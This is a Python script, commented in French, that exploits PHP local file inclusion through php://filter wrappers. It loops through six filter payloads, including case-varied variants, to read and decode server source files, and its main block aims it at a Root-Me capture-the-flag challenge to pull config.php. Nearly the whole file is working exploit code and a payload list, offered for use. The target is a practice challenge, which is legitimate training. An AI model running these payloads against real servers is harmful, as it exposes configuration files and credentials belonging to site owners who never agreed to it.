"""
Script permettant d'exploiter une faille permetant d'inclure des fichier grace au filtres PHP
rot13 ne fonctionne pas pour l'instant
"""
import requests
from models.webRessource import headers_base as headers
from bs4 import BeautifulSoup
import base64
import time

rot13 = str.maketrans(
    'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
    'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')

tempo = 1


def php_filter_exploit(url, fileName):
    result = []
    payload_liste = [
        {'payload': 'php://filter/read=convert.base64-encode/resource=', 'result': 'b64'},
        {'payload': 'pHp://FilTer/read=convert.base64-encode/resource=', 'result': 'b64'},
        {'payload': 'php://filter/convert.iconv.utf-8.utf-16/resource=', 'result': 'utf8'},
        {'payload': 'php://filter/convert.base64-encode/resource=', 'result': 'b64'},
        {'payload': 'pHp://FilTer/convert.base64-encode/resource=', 'result': 'b64'},
        {'payload': 'php://filter/read=string.rot13/resource=', 'result': 'rot13'}
    ]
    for payload in payload_liste:
        fpayload = payload['payload'] + fileName
        r = requests.get(url + fpayload, headers=headers)
        for h in BeautifulSoup(r.content, 'lxml'):
            dict_result = {'payload': payload['payload'], 'url': url + fpayload}
            if payload['result'] == 'b64':
                try:
                    dict_result['result'] = base64.b64decode(h.text.strip()).decode('utf-8', errors="ignore")
                    result.append(dict_result)
                except:
                    pass
            elif payload['result'] == 'utf8':
                try:
                    dict_result['result'] = h.text.strip()
                    result.append(dict_result)
                except:
                    pass
            elif payload['result'] == 'rot13':
                try:
                    print(h.text.strip())
                    dict_result['result'] = h.text.strip().translate(rot13)
                    result.append(dict_result)
                except Exception as e:
                    print(e)
        time.sleep(tempo)
    return result


if __name__ == "__main__":
    # print('Jrypbzr onpx !"); cevag("Gb inyvqngr gur punyyratr hfr guvf cnffjbeq"); } ryfr { cevag("Reebe : ab fhpu hfre/cnffjbeq"); } } ryfr { ?> Ybtva&aofc; Cnffjbeq&aofc;'.translate(rot13))
    for x in php_filter_exploit("http://challenge01.root-me.org/web-serveur/ch12/?inc=", "config.php"):
        print("#" * 50 + x['payload'] + "#" * 50)
        print(x['result'])
